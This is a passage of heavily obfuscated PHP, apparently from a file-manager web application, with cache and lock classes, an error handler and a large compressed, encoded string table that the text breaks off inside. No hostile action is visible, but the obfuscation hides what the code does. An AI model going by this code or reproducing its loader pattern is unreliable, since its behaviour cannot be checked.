CacheLock::unlock($Fâ†ØäÇˆ¨); goto A¿¸†©÷»Ç; A¿¸†©÷»Ç: return $a÷ŒˆÒƒŸ¡; goto eí†’Ü›; eí†’Ü›: } public static function clearMemory($bìº´¢ˆùÅ = false) { if ($bìº´¢ˆùÅ) { $bìº´¢ˆùÅ = self::key($bìº´¢ˆùÅ); unset(self::$memoryCache[$bìº´¢ˆùÅ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¼€¼ˆ¦‚¡][756])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¼€¼ˆ¦‚¡][757])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b”×èŠçõÁ, $cŞˆİéóˆã) { $aÇö÷š„çÄ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->cachePath = $b”×èŠçõÁ[$aÇö÷š„çÄ[75]]; $this->prefix = $aÇö÷š„çÄ[758]; $this->cacheTime = $cŞˆİéóˆã; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Fù¯Î¡›ãÂ) { $F˜»˜†½½Ò =& $_SERVER[¼€¼ˆ¦‚¡]; $Fù¯Î¡›ãÂ = str_replace(array($F˜»˜†½½Ò[759], $F˜»˜†½½Ò[93], $F˜»˜†½½Ò[69]), $F˜»˜†½½Ò[760], $Fù¯Î¡›ãÂ); return $this->cachePath . $F˜»˜†½½Ò[761] . $Fù¯Î¡›ãÂ . $F˜»˜†½½Ò[762]; } public function set($F‘¨ôÜÛ, $Aƒ¼­¸´İó, $CÁÂŒÃ…Ğš = false) { $fÉÙÆºæ© = $this->getFile($F‘¨ôÜÛ); if (file_put_contents($fÉÙÆºæ©, $this->prefix . $Aƒ¼­¸´İó, LOCK_EX)) { return !0; } @unlink($fÉÙÆºæ©); return !1; } public function get($a„”í¬ä‚‰) { $cÍã–ù ¥ = $this->getFile($a„”í¬ä‚‰); if (file_exists($cÍã–ù ¥) && filemtime($cÍã–ù ¥) < time() - $this->cacheTime) { @unlink($cÍã–ù ¥); return !1; } $D‚³¼ñËô = @file_get_contents($cÍã–ù ¥); return substr($D‚³¼ñËô, strlen($this->prefix)); } public function remove($føÜÉæ§À) { $dÈ°É½ª = $this->getFile($føÜÉæ§À); return @unlink($dÈ°É½ª); } public function deleteAll() { $B‹¯Š‰‘ƒ° =& $_SERVER[¼€¼ˆ¦‚¡]; $cº¤ÂáÚĞ¶ = scandir($this->cachePath); foreach ($cº¤ÂáÚĞ¶ as $cÎ‰ÏåÙ–Š) { $F³¥ÉŒ†ƒ± = $this->cachePath . $cÎ‰ÏåÙ–Š; if (strpos($F³¥ÉŒ†ƒ±, $B‹¯Š‰‘ƒ°[762]) && strpos($F³¥ÉŒ†ƒ±, $B‹¯Š‰‘ƒ°[763])) { @unlink($F³¥ÉŒ†ƒ±); } } } public function clearTimeout() { $EŸŒÛÈ†” =& $_SERVER[¼€¼ˆ¦‚¡]; $fãÑ—º“Ö´ = scandir($this->cachePath); foreach ($fãÑ—º“Ö´ as $bóìçÉ½Ÿä) { $CÎ‹Œ®Ÿƒ = $this->cachePath . $bóìçÉ½Ÿä; if (strpos($CÎ‹Œ®Ÿƒ, $EŸŒÛÈ†”[762]) && strpos($CÎ‹Œ®Ÿƒ, $EŸŒÛÈ†”[763]) && filemtime($CÎ‹Œ®Ÿƒ) < time() - $this->cacheTime) { @unlink($CÎ‹Œ®Ÿƒ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto eÔ‰ñãÉ‡§; cğ•º¹ö: self::$timeout = $bĞ¿ğÜäã[$eøœé¿í•Æ[764]] ? $bĞ¿ğÜäã[$eøœé¿í•Æ[764]] : 10; $Fœ™á—ÇÙÄ = _get($GLOBALS[$eøœé¿í•Æ[6]], $eøœé¿í•Æ[765]); $f©âø—¼õ¥ = $bĞ¿ğÜäã[$eøœé¿í•Æ[751]] ? $bĞ¿ğÜäã[$eøœé¿í•Æ[751]] : $eøœé¿í•Æ[167]; goto CÙßôö§Î–; eÔ‰ñãÉ‡§: $eøœé¿í•Æ =& $_SERVER[¼€¼ˆ¦‚¡]; if (self::$handle) { return self::$handle; } $bĞ¿ğÜäã = $GLOBALS[$eøœé¿í•Æ[6]][$eøœé¿í•Æ[337]]; goto cğ•º¹ö; CÙßôö§Î–: if ($f©âø—¼õ¥ == $eøœé¿í•Æ[17] && $Fœ™á—ÇÙÄ == $eøœé¿í•Æ[9]) { $f©âø—¼õ¥ = $eøœé¿í•Æ[167]; } switch ($f©âø—¼õ¥) { case $eøœé¿í•Æ[754]: self::$handle = new CacheLockRedis(); break; case $eøœé¿í•Æ[755]: self::$handle = new CacheLockMemcached(); break; case $eøœé¿í•Æ[17]: self::$handle = new CacheLockDatabase(); break; case $eøœé¿í•Æ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CÇåŠçê”¯; CÇåŠçê”¯: } private static function key($E“£Æ©Œ‡) { return $_SERVER[¼€¼ˆ¦‚¡][766] . Cache::key($E“£Æ©Œ‡); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($e›•³«ëÖÄ = '') { self::$errorMsg = $e›•³«ëÖÄ; } public static function lockGlobal($DõƒéŠÑ, $d‘Î’¸©—÷) { return self::lock($DõƒéŠÑ, $d‘Î’¸©—÷, !0); } public static function lock($FØƒ¾ôÇƒ, $F×›È¨ó = false, $a•õùÒ‹Ñ  = false) { goto aí¯—àÑÔ«; aí¯—àÑÔ«: $C Ü·…Ä–Ö =& $_SERVER[¼€¼ˆ¦‚¡]; $F•‚Ğ¤»è = self::init(); $Eğöá¯Ó‹ö = self::key($FØƒ¾ôÇƒ); goto B ÕÒÅÊÒ­; D‰Ã’—¸¬ã: if (!$a•õùÒ‹Ñ ) { self::$lockItem[$Eğöá¯Ó‹ö] = !0; } return $DÌâä‚âˆõ; goto Bá‘Òòë‹; B ÕÒÅÊÒ­: $F×›È¨ó = $F×›È¨ó ? $F×›È¨ó : self::$timeout; $DÌâä‚âˆõ = $F•‚Ğ¤»è->lock($Eğöá¯Ó‹ö, $F×›È¨ó); if (!$DÌâä‚âˆõ) { $C ƒ„õ±Ü = $C Ü·…Ä–Ö[767] . $F×›È¨ó . $C Ü·…Ä–Ö[67] . self::$errorMsg . $C Ü·…Ä–Ö[67] . get_caller_msg(); $b„Ë‚Ì¾÷½ = "\x4c\157\x63\x6b\x20\x61\x63\x74\151\157\156\72\40{$Eğöá¯Ó‹ö}\40\x74\151\155\x65\157\165\164\x2c\157\166\145\162\x20{$F×›È¨ó}\40\x73"; $b„Ë‚Ì¾÷½ = self::$errorMsg ? self::$errorMsg : $cì§××Û­; write_log($C ƒ„õ±Ü, $C Ü·…Ä–Ö[768]); show_json($b„Ë‚Ì¾÷½, !1); } goto D‰Ã’—¸¬ã; Bá‘Òòë‹: } public static function lockGet($b–†å´ÚÕ÷) { $c«øÂÜ¼ºñ = self::key($b–†å´ÚÕ÷); if (self::$lockItem[$c«øÂÜ¼ºñ]) { return self::$lockItem[$c«øÂÜ¼ºñ]; } return self::init()->lockGet($c«øÂÜ¼ºñ); } public static function unlock($FÄïñôïÏù) { $Dê°…„«ó = self::key($FÄïñôïÏù); self::$lockItem[$Dê°…„«ó] = null; return self::init()->unlock($Dê°…„«ó); } public static function unlockRuntime() { $bªĞ¦ã‰§Ô =& $_SERVER[¼€¼ˆ¦‚¡]; $AÒ³‡æ‹× = self::init(); $fÓØŞ³¿ì… = !1; foreach (self::$lockItem as $cĞÇ…‹¢à¦ => $bñ´×–†Ó­) { if (!$bñ´×–†Ó­) { continue; } $AÒ³‡æ‹×->unlock($cĞÇ…‹¢à¦); if (!$fÓØŞ³¿ì…) { $fÓØŞ³¿ì… = !0; write_log($bªĞ¦ã‰§Ô[769] . $cĞÇ…‹¢à¦ . $bªĞ¦ã‰§Ô[67] . get_caller_msg(), $bªĞ¦ã‰§Ô[768]); continue; } write_log($bªĞ¦ã‰§Ô[769] . $cĞÇ…‹¢à¦, $bªĞ¦ã‰§Ô[768]); } } } goto AÀ¨•ˆïÛ™; açõÂïÙˆ³: function beforeShutdownError($d’°ó­¸ = false, $f„óÅÛì¯ = '', $c¥ÀßÍœì = '', $dóê—Å¾… = 0) { $bîóáß‹¼‚ =& $_SERVER[¿‰šÇ ]; switch ($d’°ó­¸) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $F´Š­£Ğë = $bîóáß‹¼‚[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $F´Š­£Ğë = $bîóáß‹¼‚[40]; break; case E_STRICT: $F´Š­£Ğë = $bîóáß‹¼‚[41]; break; case E_NOTICE: case E_USER_NOTICE: $F´Š­£Ğë = $bîóáß‹¼‚[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $F´Š­£Ğë = $bîóáß‹¼‚[43]; break; default: break; } if (!$F´Š­£Ğë || $F´Š­£Ğë == $bîóáß‹¼‚[42] || $F´Š­£Ğë == $bîóáß‹¼‚[43]) { return; } $c¥ÀßÍœì = $bîóáß‹¼‚[4] . str_replace($_SERVER[$bîóáß‹¼‚[37]], $bîóáß‹¼‚[20], $c¥ÀßÍœì); $bê«‘‚¨Ïñ = $F´Š­£Ğë . $bîóáß‹¼‚[44] . $f„óÅÛì¯ . $bîóáß‹¼‚[44] . $c¥ÀßÍœì . $bîóáß‹¼‚[44] . $dóê—Å¾…; write_log($bê«‘‚¨Ïñ . $bîóáß‹¼‚[18] . get_caller_msg(1), $bîóáß‹¼‚[19]); } $_SERVER[$_SERVER[¿‰šÇ ][45]] = $_SERVER[$_SERVER[¿‰šÇ ][37]] . $_SERVER[¿‰šÇ ][46]; $d½œÉâ×öÒ = strrev(base64_decode($_SERVER[¿‰šÇ ][47])); goto C‡‚éÂÒœç; EÛ¸¨Ùõ²š: if (!function_exists('_kodDe')) { function _kodDe($eˆêÊŒÅƒè) { $eˆêÊŒÅƒè = base64_decode($eˆêÊŒÅƒè); $eàÆïäÏ´ = strlen($eˆêÊŒÅƒè); $C®Üé¢‘¿ = ''; $B´ÜŠÕ¢™Ò = ord($eˆêÊŒÅƒè[0]) - 30; for ($b‹¶‹–ø˜ù = 1; $b‹¶‹–ø˜ù < $eàÆïäÏ´; $b‹¶‹–ø˜ù += 2) { if ($b‹¶‹–ø˜ù + 1 < $eàÆïäÏ´) { $C®Üé¢‘¿ .= chr(ord($eˆêÊŒÅƒè[$b‹¶‹–ø˜ù + 1]) + $B´ÜŠÕ¢™Ò); $C®Üé¢‘¿ .= chr(ord($eˆêÊŒÅƒè[$b‹¶‹–ø˜ù]) + $B´ÜŠÕ¢™Ò); } else { $C®Üé¢‘¿ .= chr(ord($eˆêÊŒÅƒè[$b‹¶‹–ø˜ù]) + $B´ÜŠÕ¢™Ò); } } return $C®Üé¢‘¿; } } define("\xbc\x80\xbc\x88\xa6\x82\xa1", base64_decode('r6g=')); $_SERVER[¼€¼ˆ¦‚¡] = explode("\174\4\174\5\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\11\170\33\305\325\234\245\4\2\374\224\162\224\26\26\347\360\21\35\76\162\72\261\23\331\222\143\45\266\345\110\162\234\140\71\142\45\255\244\265\45\255\274\273\222"."\345\34\120\112\70\2\15\367\115\302\175\204\2\111\200\162\37\201\37\12\5\112\241\24\50\51\147\3\111\200\122\132\240\341\50\55\374\163\317\354\112\246\355\317\207\243\231\67\157\146\347\170\363\346\315\314\173"."\x6f\xb6\x6d\x5c\x77\xe5\xd3\xd7\xae\xde\x6f\xf5\xfe\xab\xf7\xde\xfa\xe7\x87\xb7\x9c\x8b\x83\xab\xf7\x59\xbd\x2f\xf8\x45\xe1\xe3\xcf\xf9\xfe\x5e\xe8\xbf\x7d\xb3\x4b\x1e\xef\xd9\xa7\xe1\xb0\xee\xe9\x2b\xfe\x39\xa1\xe7\xea\x83\x27"."\xbf\xb5\x6e\x6f\xcf\xf2\x1b\x1c\x23\xeb\xce\x79\xea\xc6\xda\xbf\x3c\x36\xf3\xe2\x7b\xd5\x87\x2e\x38\xba\xf5\xad\x4b\xae\x50\xfa\xff\xf7\xa6\xcf\x56\x34\x6b\xbb\x9e\x3f\xf8\xf5\xe8\x47\xee\x2f\xfa\xb7\x2c\xfd\x59\x47\xcd\xed\xcb".strrev('è»nS×ıZ?+Èóêv·œ_kƒØòÜ¿¯3„óşnÔ÷ÕÒ³ÃúàŞèò½~½ÓôRf{o')."\341\227\102\167\76\270\375\250\51\53\342\173\375\365\216\205\147\375\165\342\31\255\317\354\373\345\346\306\303\213\177\177\356\364\237\36\266\253\270\357\31\301\266\275\117\154\172\355\324\5\157\335\372\165\337\365\363"."\217\177\362\234\243\237\11\206\7\266\52\67\36\163\302\221\113\253\116\376\321\13\201\137\176\261\147\353\341\127\356\251\172\166\252\372\333\253\357\66\237\275\371\203\15\353\217\72\120\275\154\353\135\307\335\165\375"."\317\137\72\371\367\277\171\302\163\351\274\255\333\117\152\365\174\163\341\301\333\153\306\332\77\135\166\311\313\33\107\356\76\163\303\252\33\16\176\263\351\234\25\7\176\332\174\317\222\3\33\33\367\331\355\371\333"."\xf7\xdf\xfb\xd7\x91\xfb\xbe\x3b\xed\xa6\x3f\x95\x5e\x3d\xce\x7d\xc3\x2b\x97\x3e\xb7\x4b\xba\xe6\xa0\xdd\x4f\xbe\xb9\xea\x9d\xaf\x16\x6e\xbb\xe3\x99\x97\xf\xdd\x70\xd5\xb5\x8a\x63\xc1\xed\x9f\x3b\x1e\xf3\x29\x13\xa7\xdd\x7f\xc1"."\53\137\275\240\36\62\351\236\265\335\147\256\235\171\327\235\301\355\357\256\175\354\276\7\266\174\364\263\300\113\321\65\113\236\377\355\333\373\354\265\27\356\350\146\374\43\345\64\123\122\112\252\141\32\30\20\327"."\162\111\65\205\303\152\16\377\272\361\217\61\222\121\115\5\207\243\75\201\160\64\324\327\333\353\13\206\243\244\104\61\75\253\45\110\50\57\353\162\226\24\236\127\164\3\174\112\54\56\232\327\362\112\316\2\341"."\x80\x84\x6c\xca\x31\xd9\x20\x25\x79\xdb\xa2\x5e\x5f\x6f\x57\x60\x79\x34\xbc\xbc\xd7\x47\x30\x62\xd1\x91\x82\xa2\x8f\xe1\x18\xa\x86\x4c\x59\x37\xc3\x6a\x56\x61\x18\xa3\x3a\xab\x57\x9b\x6f\xa1\xbf\x47\xa\x7\x3d\x3d\x21\x4f\x7b"."\330\37\350\301\340\366\100\167\267\77\134\16\17\6\272\272\332\74\355\213\313\123\172\203\236\205\335\36\11\324\57\243\104\325\134\122\253\221\116\302\51\47\111\265\70\320\241\52\231\4\16\346\144\132\35\163\54".base64_decode('T0JhFgJjkCtkMjjSw0Kk/kpSLmRIn3nFSF5XszJt+mJljEFxQC6YmpqL44ivZOoyh4Max3Ulq+RI')."\x51\x21\x5f\x97\xaf\x3d\x2c\xc1\x6a\x4a\x1d\xc1\x40\xb7\x44\x86\x22\x2b\x1b\xa6\xa2\x4b\xfd\x9d\xbe\xa0\x4f\x82\x55\x6f\xa9\x46\x2d\xae\x96\x70\xbe\xbe\x1e\xd0\x21\x92\xa7\xab\x4b\x1a\xaf\x4\x53\xc9\xe6\x69\x31\x38\x4f\x85\xc2"."\2\101\257\57\50\265\55\227\170\77\305\265\154\126\313\271\100\51\140\74\115\241\252\276\140\20\7\34\204\202\273\374\160\350\110\44\320\321\21\362\261\30\151\334\222\56\120\223\46\102\245\226\130\42\231\61\243"."\105\71\123\240\304\72\214\177\253\311\17\371\325\14\102\300\43\152\116\55\20\142\45\105\150\32\233\71\44\120\240\330\12\205\144\101\66\215\314\51\60\301\212\70\330\322\212\177\347\22\244\130\24\246\51\272\31"."\x55\x72\x71\x2d\xa1\xe6\xc8\x34\x9c\x4f\xa6\x1c\x21\x3c\xd9\x4c\x7b\x75\x15\xe0\x91\x2\x35\x57\x5c\xcb\x8f\x75\x6b\x45\xd2\x86\xa4\x9a\x51\xba\xd8\x2c\x4b\x6a\x99\x84\xa2\xf3\x78\x1e\x64\x17\x53\x48\x63\xd4\x95\x42\xee\x9e\x42"."\x56\x44\x61\xd1\x78\x5a\xcd\x24\x74\x3a\x39\xbf\xb\xb3\x81\x14\xab\x98\x26\x68\x86\x41\x6b\xda\x97\xcf\x68\x72\x22\xa4\xe8\x42\xed\x3b\x40\x31\x81\x82\x29\x2\xb\x8\xad\x43\xd3\xb3\x5e\xc0\x0\x48\xef\x0\xb2\x57\xfb\x2a\x24"."\14\123\302\117\10\235\342\42\214\253\146\340\124\347\67\203\3\13\300\77\265\204\213\105\110\325\322\112\46\23\125\112\12\231\40\331\304\14\203\326\336\155\304\324\234\33\100\160\324\37\210\246\145\43\335\235\230"."\21\105\271\50\163\114\50\45\127\76\235\47\163\230\115\333\210\205\200\141\177\367\150\246\117\140\261\31\55\56\147\304\226\342\160\332\64\363\41\45\227\200\35\102\132\244\215\346\120\207\345\25\205\40\171\35\122".strrev('ÔgÏ‘Æg:LÁK_e§Í$$ÉJâEQ4"Y 0fµ´BÃ6fÒñÎ1É+@.¥3jÍK––êB')."\270\154\252\132\316\255\305\115\305\164\32\246\256\310\244\264\252\271\22\244\10\70\203\353\160\56\72\173\332\265\234\11\246\257\63\254\313\71\43\251\350\116\37\41\357\146\11\364\63\343\140\24\315\253\32\171\315"."\x50\xe1\x67\x9a\x25\xd9\x34\xe5\x78\x1a\xce\x7e\x5e\x7c\xcb\x77\xe0\xab\xb9\x8c\x9a\x53\xca\x70\x3d\xf1\xb8\x62\x18\x4e\x98\x45\xd7\x32\x4e\x4f\x26\xa3\x8d\x3a\x3\xba\x9a\x52\x41\x9e\x3a\x5b\x35\x1\x67\x6a\x96\x28\xdb\xcc\xab"."\272\142\320\250\264\260\73\114\220\101\255\24\147\257\56\247\262\162\263\224\57\304\100\317\220\371\131\1\206\261\311\327\233\245\70\214\72\244\154\301\60\235\272\2\330\217\12\26\72\62\170\376\244\263\33\216\247"."\252\44\234\41\300\245\11\270\251\176\272\4\310\110\242\151\30\332\31\16\367\106\375\35\140\61\356\361\105\273\75\341\366\116\122\155\123\116\321\72\167\1\336\313\212\244\300\145\116\60\345\40\241\365\200\76\342"."\xc0\x5e\x6d\x54\xd1\xc1\x87\xdb\xc6\x9a\xa5\x61\x2d\x11\xd3\x4a\x2e\x9a\x4\x91\x43\x80\x4b\x50\x64\xd8\xa3\x79\xd3\x19\x94\x73\x29\xd8\x3f\xb1\x31\x53\x21\xe4\x68\x14\x53\xd6\xe\xed\x52\x72\x29\x33\x4d\x33\x86\x7c\xc1\xa5\xbe"."\x60\x34\x14\xe8\x8\xf7\x7b\x82\x64\x19\xcf\x81\x81\x28\xd1\x4f\xc1\xa2\x33\xce\xa0\x92\x0\x5d\x1f\x37\x69\x3e\x39\xf\x7b\x8d\xe2\xc0\x89\x2\xc7\x98\xa6\xc2\xc9\x43\xd3\xba\xfc\xb\x61\xc7\x78\x9d\x6\x40\x72\x8a\x58\xb4\xec"."\56\65\253\302\272\233\54\5\365\44\130\343\27\222\12\271\121\203\132\42\351\272\232\110\142\132\255\23\374\133\127\73\20\361\272\352\6\347\273\125\236\307\335\340\152\220\32\353\147\112\275\100\350\120\345\214\104".base64_decode('Gl2GUS8FFn9HB8A1SZjmtq7DwKBvSZ8vFI52+8KdAS/5gs9DQl0anpq0RQP4Z5CMIBAVUkpcy2i6')."\x9c\x81\xc\x88\xd2\x9b\x42\x99\x40\x4a\x4d\x72\xbe\xee\x7\x2\xd\xe9\x58\xcc\xf9\x78\x24\xa4\x66\xf3\x94\x41\x99\xe9\x42\x36\x26\x4\xdd\xbc\x4\x42\xb\x60\xc8\x18\x5b\xd2\xd8\x1a\xa4\xe9\x24\xd4\xec\x26\x59\xa6\x34\x76\x50"."\146\353\16\65\201\377\71\147\115\150\131\231\112\242\150\342\52\11\74\163\61\250\316\222\322\251\310\174\121\63\165\123\203\120\335\202\322\255\230\151\215\364\163\112\241\125\52\260\272\321\132\46\224\214\102\173\51"."\xad\x50\x2e\xd\xc4\xab\x22\xeb\xbc\xbc\xae\x24\x55\x42\xb7\x40\x9e\x2\x70\xce\x85\x55\x23\x8\x32\x41\xf9\x86\xc6\xfb\xa1\x18\xca\x1\x26\x67\xd8\xb2\xc1\x99\x3e\x8c\x8\x2b\x73\x47\x5f\x57\x57\xb4\x3d\xd0\x13\x6\xa2\x28\x86"."\xf4\x7\xfd\x61\x1f\xa5\x8\x8f\x37\xea\x69\xef\x65\x4b\x18\x1f\x26\x82\x0\xa7\x67\x39\x7b\xc3\x90\x62\xa3\xc0\xf7\xf9\x2\xc1\x59\x2e\x5d\xe8\x20\x4b\xc5\x61\xc0\xb\xf3\x5a\xce\x50\x9c\x71\x52\x5a\x82\x33\x5f\x8c\x31\xd7\xc6"."\x79\xcb\x72\x70\x1\xb8\xe4\x94\xb3\x2b\x9d\x59\xc5\x94\x9d\xac\xea\xd6\xf5\x4d\xa\x8b\xcb\xa4\x9f\xc\x1\x67\x96\x19\xb0\xa8\x82\xfd\x5\x5d\x58\x7b\x3\x21\x92\x61\x3e\x84\x2\x69\x24\xa6\xe8\xa4\x1e\xbd\x7d\x24\x29\x2b\xc"."\xff\x42\x1f\x1\x4e\xa0\x6b\xa3\x4c\x24\x17\x4f\x7f\x88\x32\xba\x2\xc0\xd7\xd5\x95\x32\x6f\xe3\x7c\x5a\x1f\x52\x76\x29\x9b\xe1\x2\x56\x54\xb5\x8c\x5f\x54\x8b\xd\x1\x2e\x6\x88\x4e\xae\xd4\x6a\x27\x1f\xab\x70\xa7\xbf\x67\x71"."\264\73\340\365\165\105\375\75\200\113\204\313\341\175\275\136\17\35\174\21\336\26\10\167\132\240\175\200\117\54\365\164\371\355\350\276\145\376\120\70\124\61\11\300\372\174\266\24\260\345\352\15\372\72\374\313\130".base64_decode('tMPv6/KGou2e9k6O0+PpJpFoEm56DLcVPwoYXohtnaJFuA2knRm17FOiVAKPcjoBi5dCaJM0F24+')."\121\113\210\114\34\327\12\224\132\231\20\227\245\14\42\53\223\31\52\323\205\251\6\377\324\112\236\220\144\346\243\214\25\304\306\130\20\65\203\306\201\270\106\276\57\21\346\133\126\203\50\304\151\123\222\232\256"."\x7c\x17\xc0\x93\x34\x19\x61\xd8\xe2\x60\xde\xf0\x34\x30\x2\x1e\xb4\xcb\x5\x94\x80\x46\x24\x4a\xe7\xa2\x1\xf6\x7\x1e\x5a\x9d\x24\xdf\x61\x46\x3\x60\x2b\xee\x81\xfb\xd3\x68\x7f\x30\xd0\xb3\x90\x64\x18\x4d\x2b\xb4\x2\x7e\xd2"."\xfd\x35\x54\x98\x21\xdb\x54\x93\xb3\x24\x20\x89\xc8\x5c\xa8\xa4\x9d\x3e\xa4\xd1\xae\x5c\x8d\x7f\xa6\xe2\x1f\x20\xbc\x91\x8f\x2b\x39\xda\xeb\x31\xc8\x98\x19\xe3\xa0\x7b\x10\x30\x5b\x28\x53\xd5\xa\xec\x6b\x31\x4d\xcb\xd0\x79\xc"."\xd6\x63\xc6\x2f\xd8\x6\x77\xc8\xa0\x44\x52\xa2\xcc\x69\x1a\x5d\xb5\xc8\xe2\x10\xe\x2c\xf6\xf5\x44\x29\x65\xe1\x98\x40\x8d\x18\x0\xb6\x8c\x81\x20\xe9\x10\x53\x1b\xa6\x1b\x18\x9c\x18\xf4\x85\x28\x17\xd0\x95\x91\x82\x4a\xbb\xcb"."\355\232\106\250\130\1\353\17\371\274\173\105\144\164\132\315\200\163\232\153\20\4\152\353\26\340\50\211\105\134\226\350\144\222\277\240\263\334\120\114\251\61\346\327\66\107\334\21\167\315\374\346\1\217\163\245\354".base64_decode('XFnvnOMcnBZx1U4jgMFVjY7payACQJw/aRD8tETmT4k4p5580oKByGB187QTIq5JkdHButr59Dvx')."\x82\xe\x36\x67\xf1\x31\x56\xd5\xc4\xb4\x1a\x50\x25\x20\xbe\x30\x94\x1c\x62\x89\x2\x2\x4d\x58\xa9\xe6\x39\x74\xd5\xcc\x35\x14\xe\xc6\x50\x49\xf1\x1c\x3\xce\xc8\xb4\xc1\xf9\x42\x3e\x1\x64\xff\x16\x10\x5d\x0\x7f\x4e\x33\x3c"."\x8f\xf3\x44\xd8\x32\x96\x15\xce\x7b\x42\x1f\x85\x5c\x9c\x73\x57\x38\x2f\x62\x72\x9c\xf0\x1\x35\x95\x63\x53\x8\x2c\xe8\x6c\x53\x6c\x95\x9a\x57\x4d\xc1\xbf\x6b\xe8\x40\xa6\x14\xba\x2c\xc3\xf3\x2c\x9d\x50\x67\x21\xa7\x8e\xd0\xad"."\176\116\31\41\1\315\244\364\35\123\314\121\205\222\7\200\133\342\200\70\350\266\15\44\11\261\14\22\322\310\27\370\166\111\101\173\7\322\212\174\24\212\135\243\54\226\120\162\144\234\16\44\330\106\134\316\53"."\x21\xa1\x85\xd1\x68\xd8\xd3\xd6\xe5\x8b\x52\xe\x43\x38\x31\x8d\x23\xae\xd8\xc6\xe\xc7\x40\xd3\x38\x47\xa5\xfc\x21\xce\x45\x66\x63\x24\x23\x21\x66\x20\x29\xba\xae\xe9\xcd\xe8\xe0\xcf\x28\xe4\xa1\x2c\x6\x76\x4d\x26\xe8\x4f\x9"."\154\245\245\226\126\11\167\63\341\22\121\261\323\363\62\225\46\340\356\226\111\10\356\232\110\244\60\240\44\6\7\0\41\313\316\344\340\252\246\65\265\124\112\166\107\300\177\64\202\371\27\251\161\236\217\237\1".base64_decode('ZK24yRbcsvOpKOOAsArsmEHT2ToL4VxqNTVTzjA0mBaGEMpt6FpN9uh4ALs4E4Krs3B6hzhkDzua')."\142\47\16\302\301\21\200\71\204\50\376\267\245\212\262\351\34\230\10\355\174\221\362\173\235\144\20\75\313\234\176\42\300\263\200\112\105\115\31\114\147\223\102\15\255\240\307\25\206\143\21\62\114\131\7\153\26"."\227\354\240\14\46\34\57\202\232\73\340\71\204\3\256\251\16\40\355\71\340\171\217\203\113\254\16\176\204\340\140\362\247\203\210\245\16\136\72\11\372\275\16\325\360\42\361\30\225\213\222\150\235\315\64\334\220"."\x67\xe4\x31\x7\xae\x7f\x97\x52\x54\x32\xe\x5a\x7b\x7\x6d\x94\x83\xb6\xc0\x81\xf6\x1b\x5e\x52\x9b\x3e\x40\x1f\xa4\x36\x28\x8\x98\x44\xda\x1\x87\x3\x8e\x2d\x2d\x5\x6\x69\x37\x30\xa1\xda\xc1\x5\x6e\x47\x4a\xd7\xa\xf9\x5e".base64_decode('+iUhhitDALymDBDUNNNBN0As0M04EKwODy3lA85rz5ZP0gQct9cBQ2F6h1wUB7jiYOeshMFPSflp')."\x1e\x17\x97\xec\x1b\x11\xfb\xf1\x10\xef\x44\x5e\x89\xb0\x9c\xa\x9\x9f\x37\xe5\x14\xfd\x76\x85\x54\x1c\xe\x2a\xf1\xb1\x38\xdf\xdc\x78\x85\xdd\x92\x35\xc6\x86\x1e\xd1\x61\x25\x62\xaa\x3c\xf4\x8c\x40\x18\xad\x4d\x38\xf0\x40\x4a".base64_decode('2ZyOCPlYiG1c6uZtCuT5igMZQgjwQWHKU1CAc5gCWSFlI05lmVF6T6FQmFB/2npLuTDKZyZtogQL')."\160\10\74\33\216\216\223\17\261\20\45\77\252\26\305\375\32\315\262\235\5\353\150\33\63\202\375\336\253\346\306\324\234\270\167\347\120\316\363\70\121\100\362\346\61\334\307\343\205\61\157\341\147\3\16\162\146"."\xe0\x0\xfb\xc6\x61\x81\xeb\xf1\x3d\x2e\xa8\x3d\xcc\x2a\xd4\x9d\x94\x64\xab\x39\x9d\x80\x4e\x6b\x94\xcf\xc7\x3e\xb0\x4d\x8a\xda\x48\x95\x10\x69\x5a\xd6\x79\x2f\xd3\x39\x6\x9\x9b\xb5\xca\x80\x28\x3c\x2a\xa0\x25\xe5\x22\x67\xf7"."\x96\x3c\xc2\xcc\x30\xcc\x31\x76\xcc\x21\x4\xad\x85\xe2\xa8\x77\xbc\x48\x27\xdb\xfd\x55\x8a\x8a\x93\x4e\x35\xba\x40\x6f\x56\xa\xa3\x96\x86\xb5\x8a\x51\x24\x15\x48\x40\x1e\xa0\xc7\x64\x54\xbc\x8f\xda\x8e\x19\x40\x54\x18\xa9\xa8".base64_decode('5UQCV8PDWB8QbDJgBHQXnCQLIWMTVyG+QkFmisMCUt7OAy28utLCZ+fWNqgtyj9q4TtlqxMRTogs')."\132\117\250\76\1\166\215\56\35\163\66\27\20\77\310\135\217\243\136\130\336\370\364\135\145\214\31\246\222\45\234\160\215\255\167\114\260\275\211\311\272\113\7\65\342\25\345\113\2\21\76\12\14\60\150\307\300"."\305\167\151\124\26\206\364\357\113\250\46\204\100\156\246\321\103\53\216\50\260\171\6\23\12\104\135\342\52\33\203\214\72\114\162\71\246\130\60\53\161\162\127\35\342\271\56\276\366\210\53\227\170\253\4\321\170"."\xcb\xe1\x2d\x15\xe\x9\xf7\xb1\x59\x76\x6d\x85\x80\x2e\xc3\xd4\xf2\x3c\x45\x88\xe2\x64\x21\x89\x17\x2a\x60\xb1\xce\x47\x35\x4\x2b\x40\x2\xc9\x7\xbc\xb\x11\x2e\xc9\x8b\x24\x68\x4c\xdc\xae\xc\xc0\x70\x89\xac\xc8\xa3\xeb\x94"."\x48\x70\xf3\xe0\x9\xe\x0\x8a\x20\x38\x5d\x43\xf4\x4\xb1\x12\x47\xc6\x85\xfb\x8a\xfc\x9e\x15\x17\x5\x3f\xec\xc2\xb\x94\x4b\x4e\x24\x2\xf4\x78\x4d\xc\x97\xa3\x8a\xa7\x9\x95\xb\x42\x57\xdf\xa